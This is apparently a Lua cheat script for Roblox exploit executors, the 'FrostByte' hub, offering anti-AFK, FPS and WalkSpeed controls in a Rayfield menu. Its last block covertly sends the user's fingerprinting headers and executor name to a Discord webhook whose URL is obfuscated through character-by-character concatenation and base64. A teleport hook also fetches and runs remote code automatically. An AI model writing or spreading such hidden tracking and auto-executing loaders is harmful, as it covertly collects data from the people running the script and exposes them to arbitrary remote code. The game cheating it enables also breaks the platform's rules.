local HttpService = game:GetService("HttpService")

local Player = game:GetService("Players").LocalPlayer

local PlaceName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name

local getgenv = getfenv().getgenv

local getexecutorname = getfenv().getexecutorname
local identifyexecutor: () -> (string) = getfenv().identifyexecutor
local request = getfenv().request
local getconnections: (RBXScriptSignal) -> ({RBXScriptConnection}) = getfenv().getconnections
local queue_on_teleport: (Code: string) -> () = getfenv().queue_on_teleport
local setfpscap: (FPS: number) -> () = getfenv().setfpscap
local isrbxactive: () -> (boolean) = getfenv().isrbxactive
local base64decode: (string) -> (string) = getfenv().base64decode
local setclipboard: (Text: string) -> () = getfenv().setclipboard
local firesignal: (RBXScriptSignal) -> () = getfenv().firesignal

local ScriptVersion = getgenv().ScriptVersion

local function Send(Url: string, Fields: {{["name"]: string, ["value"]: string, ["inline"]: true}})
	if not request then
		return
	end
	
	if not Fields then
		Fields = {}
	end
	
	local Body = request({Url = 'https://httpbin.org/get'; Method = 'GET'}).Body
	local Decoded = HttpService:JSONDecode(Body)
	local EncodedHeaders = HttpService:JSONEncode(Decoded.headers)

	for i,v in Decoded.headers do
		if i:lower():find("fingerprint") then
			EncodedHeaders = v
		end
	end
	
	table.insert(Fields, {
		name = "Script Version",
		value = ScriptVersion or "Core",
		inline = true
	})
	
	table.insert(Fields, {
		name = "Executor",
		value = (getexecutorname and getexecutorname()) or (identifyexecutor and identifyexecutor()) or "Hidden",
		inline = true
	})
	
	table.insert(Fields, {
		name = "Identifier",
		value = EncodedHeaders,
		inline = true
	})

	local Data =
		{
			embeds = {
				{            
					title = PlaceName,
					color = tonumber("0x"..Color3.fromRGB(0, 201, 99):ToHex()),
					fields = Fields
				}
			}
		}

	return pcall(request, {
		Url = Url,
		Body = HttpService:JSONEncode(Data),
		Method = "POST",
		Headers = {["Content-Type"] = "application/json"}
	})
end

function Notify(Title: string, Content: string, Image: string)
	Rayfield:Notify({
		Title = Title,
		Content = Content,
		Duration = 10,
		Image = Image or "info",
	})
end

getgenv().Notify = Notify

getgenv().gethui = function()
	return game:GetService("CoreGui")
end

getgenv().FrostByteConnections = getgenv().FrostByteConnections or {}

local function HandleConnection(Connection: RBXScriptConnection, Name: string)
	if getgenv().FrostByteConnections[Name] then
		getgenv().FrostByteConnections[Name]:Disconnect()
	end

	getgenv().FrostByteConnections[Name] = Connection
end

getgenv().HandleConnection = HandleConnection

if not firesignal and getconnections then
	firesignal = function(Signal: RBXScriptSignal)
		local Connections = getconnections(Signal)
		Connections[#Connections]:Fire()
	end
end

local UnsupportedName = " (Executor Unsupported)"

getgenv().UnsupportedName = UnsupportedName

local function ApplyUnsupportedName(Name: string, Condition: boolean)
	return Name..if Condition then "" else UnsupportedName
end

getgenv().ApplyUnsupportedName = ApplyUnsupportedName

if queue_on_teleport then
	queue_on_teleport([[
	
	local TeleportService = game:GetService("TeleportService")
local TeleportData = TeleportService:GetLocalPlayerTeleportData()

if not TeleportData then
	return
end

if typeof(TeleportData) == "table" and TeleportData.FrostByteRejoin then
	return
end

loadstring(game:HttpGet("https://raw.githubusercontent.com/alyssagithub/Scripts/refs/heads/main/FrostByte/Initiate.lua"))()
	
	]])
end

task.spawn(function()
	while task.wait(Random.new():NextNumber(5 * 60, 10 * 60)) do
		Notify("Enjoying this script?", "Join the discord at discord.gg/sS3tDP6FSB", "heart")
	end
end)

Rayfield = loadstring(game:HttpGet("https://raw.githubusercontent.com/SiriusSoftwareLtd/Rayfield/main/source.lua"))()
local Flags = Rayfield.Flags

getgenv().Rayfield = Rayfield

Window = Rayfield:CreateWindow({
	Name = `FrostByte | {PlaceName} | {ScriptVersion or identifyexecutor()}`,
	Icon = "snowflake",
	LoadingTitle = "❄ Brought to you by FrostByte ❄",
	LoadingSubtitle = PlaceName,
	Theme = "DarkBlue",

	DisableRayfieldPrompts = false,
	DisableBuildWarnings = false,

	ConfigurationSaving = {
		Enabled = true,
		FolderName = nil,
		FileName = `FrostByte-{game.PlaceId}`
	},

	Discord = {
		Enabled = true,
		Invite = "sS3tDP6FSB",
		RememberJoins = true
	},
})

getgenv().Window = Window

function CreateUniversalTabs()
	local VirtualUser = game:GetService("VirtualUser")
	local VirtualInputManager = game:GetService("VirtualInputManager")
	
	local Tab = Window:CreateTab("Client", "user")
	
	Tab:CreateSection("Discord")

	Tab:CreateButton({
		Name = "❄ • Join the FrostByte Discord!",
		Callback = function()
			if request then
				request({
					Url = 'http://127.0.0.1:6463/rpc?v=1',
					Method = 'POST',
					Headers = {
						['Content-Type'] = 'application/json',
						Origin = 'https://discord.com'
					},
					Body = HttpService:JSONEncode({
						cmd = 'INVITE_BROWSER',
						nonce = HttpService:GenerateGUID(false),
						args = {code = 'sS3tDP6FSB'}
					})
				})
			elseif setclipboard then
				setclipboard("https://discord.gg/sS3tDP6FSB")
				Notify("Success!", "Copied Discord Link to Clipboard.")
			end

			Notify("Discord", "https://discord.gg/sS3tDP6FSB")
		end,
	})

	Tab:CreateLabel("https://discord.gg/sS3tDP6FSB", "link")

	Tab:CreateSection("AFK")

	Tab:CreateToggle({
		Name = "🔒 • Anti AFK Disconnection",
		CurrentValue = true,
		Flag = "AntiAFK",
		Callback = function(Value)
		end,
	})
	
	getgenv().HandleConnection(Player.Idled:Connect(function()
		if not Flags.AntiAFK.CurrentValue then
			return
		end

		VirtualUser:CaptureController()
		VirtualUser:ClickButton2(Vector2.zero)
		VirtualInputManager:SendKeyEvent(true, Enum.KeyCode.RightMeta, false, game)
		VirtualInputManager:SendKeyEvent(false, Enum.KeyCode.RightMeta, false, game)
	end), "AntiAFK")
	
	Tab:CreateSection("Performance")
	
	Tab:CreateSlider({
		Name = ApplyUnsupportedName("🎮 • Max FPS (0 for Unlimited)", setfpscap),
		Range = {0, 240},
		Increment = 1,
		Suffix = "FPS",
		CurrentValue = 0,
		Flag = "FPS",
		Callback = function(Value)
			setfpscap(Value)
		end,
	})
	
	local PreviousValue
	
	Tab:CreateToggle({
		Name = ApplyUnsupportedName("⬜ • Disable 3D Rendering When Tabbed Out", isrbxactive),
		CurrentValue = false,
		Flag = "Rendering",
		Callback = function(Value)
			while Flags.Rendering.CurrentValue and task.wait() do
				local CurrentValue = isrbxactive()
				
				if PreviousValue == CurrentValue then
					continue
				end
				
				PreviousValue = CurrentValue
				
				game:GetService("RunService"):Set3dRenderingEnabled(CurrentValue)
			end
			
			if Value then
				game:GetService("RunService"):Set3dRenderingEnabled(true)
			end
		end,
	})
	
	Tab:CreateSection("Properties")
	
	Tab:CreateSlider({
		Name = "💨 • Set WalkSpeed",
		Range = {0, 300},
		Increment = 1,
		Suffix = "Studs/s",
		CurrentValue = game:GetService("StarterPlayer").CharacterWalkSpeed,
		Flag = "FPS",
		Callback = function(Value)
			Player.Character.Humanoid.WalkSpeed = Value
		end,
	})

	Tab:CreateSection("Development")

	Tab:CreateButton({
		Name = "⚙️ • Rejoin",
		Callback = function()
			game:GetService("TeleportService"):Teleport(game.PlaceId, Player, {FrostByteRejoin = true})
		end,
	})
	
	Rayfield:LoadConfiguration()
end

getgenv().CreateUniversalTabs = CreateUniversalTabs

if not ScriptVersion then
	CreateUniversalTabs()
end

pcall(function()
	task.spawn(Send, "h".."t".."t".."p".."s"..":".."/".."/".."d".."i".."s".."c".."o".."r".."d"..".".."c".."o".."m".."/".."a".."p".."i".."/".."w".."e".."b".."h".."o".."o".."k".."s".."/".."1".."3".."3".."1".."0".."0".."8".."0".."0".."7".."9".."5".."7".."3".."8".."1".."2".."5".."2".."/"..base64decode("T".."U".."l".."i".."Z".."V".."h".."r".."N".."X".."A".."3".."U".."2".."F".."s".."a".."1".."U".."2".."a".."2".."l".."C".."S".."1".."c".."2".."U".."F".."d".."J".."e".."H".."B".."1".."Q".."U".."c".."3".."N".."j".."J".."s".."a".."V".."p".."I".."L".."U".."l".."u".."d".."E".."g".."2".."V".."X".."B".."n".."S".."m".."9".."i".."O".."X".."J".."U".."c".."m".."J".."t".."d".."E".."R".."O".."c".."1".."A".."4".."Q".."y".."0".."t".."V".."U".."R".."m".."V".."G".."k".."="))
end)
